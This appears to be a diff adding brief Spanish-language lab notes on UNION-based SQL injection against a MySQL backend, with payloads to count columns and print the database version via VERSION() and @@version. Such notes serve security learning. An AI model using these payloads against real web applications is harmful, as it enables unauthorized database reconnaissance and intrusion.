@@ -1,0 +1,13 @@
+bueno primero que nada vemos que aca no hay una tabla dual a la cual acceder como oracle
+
+como ese es mysql para determinar el numero de columnas simplemente hacemos 
+
+' UNION SELECT NULL, NULL-- -
+
+y para imprimir la version simplemente hacemos
+
+' UNION SELECT VERSION(), NULL-- -
+
+tambien es valido
+
+' UNION SELECT @@version, NULL-- -
